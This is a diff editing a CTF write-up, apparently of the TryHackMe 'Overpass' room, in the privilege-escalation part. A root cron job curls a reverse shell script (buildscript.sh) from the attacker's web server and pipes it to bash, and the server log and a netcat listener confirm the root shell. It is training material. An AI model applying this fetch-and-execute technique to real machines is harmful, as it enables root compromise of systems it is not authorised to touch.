@@ -753,6 +753,8 @@ Upon the next minute cycle, the root cron job executes:
 2. **Download:** `curl` connects to the attacker's web server (Port 80), downloading the malicious reverse shell payload (`buildscript.sh`).
 3. **Execution:** The payload is piped to `bash` and executed as **`root`**.
 
+Web Server Confirmation: The attacker's Python server confirms the request came from the target machine's IP (`10.66.180.249`).
+
 ```shell
 ─(kali㉿kali)-[~/CS/THM/Overpass]
 └─$ python3 -m http.server 80 
@@ -760,7 +762,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.66.180.249 - - [03/Dec/2025 06:56:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
 ```
 
-Check the **netcat listener** on the attacker machine for the reverse shell from the target.
+Reverse Shell Confirmation: The netcat listener receives the connection, granting a shell with **root** privileges.
 
 ```shell
 ┌──(kali㉿kali)-[~/CS/THM/Overpass]
